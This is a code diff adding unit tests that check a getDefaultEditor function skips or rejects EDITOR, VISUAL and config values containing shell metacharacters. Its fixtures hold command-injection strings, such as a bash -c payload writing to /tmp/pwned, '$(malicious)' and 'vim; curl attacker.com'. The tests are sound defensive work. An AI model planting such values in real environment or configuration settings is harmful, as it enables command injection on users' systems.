@@ -76,6 +76,43 @@ describe("getDefaultEditor", () => {
 		).rejects.toThrow(/No text editor found/)
 	})
 
+	test("skips EDITOR env var when it contains shell metacharacters", async () => {
+		process.env.EDITOR = "/usr/bin/env -S bash -c 'id > /tmp/pwned' #"
+
+		const editor = await getDefaultEditor({
+			getHomeConfig: async () => ({}),
+			commandExists: (command) => command === "nano",
+			platform: "linux",
+		})
+		// Should fall through to system defaults, not use the unsafe EDITOR value
+		expect(editor).toBe("nano")
+		expect(editor).not.toBe(process.env.EDITOR)
+	})
+
+	test("skips VISUAL env var when it contains shell metacharacters", async () => {
+		process.env.VISUAL = "$(malicious)"
+
+		const editor = await getDefaultEditor({
+			getHomeConfig: async () => ({}),
+			commandExists: (command) => command === "vi",
+			platform: "linux",
+		})
+		expect(editor).toBe("vi")
+		expect(editor).not.toBe(process.env.VISUAL)
+	})
+
+	test("throws when config editor contains shell metacharacters", async () => {
+		await expect(
+			getDefaultEditor({
+				getHomeConfig: async () => ({
+					editor: "vim; curl attacker.com",
+				}),
+				commandExists: () => false,
+				platform: "linux",
+			}),
+		).rejects.toThrow(/unsafe characters/)
+	})
+
 	test("commandExists returns true for a valid command", () => {
 		expect(commandExists("bun")).toBe(true)
 	})
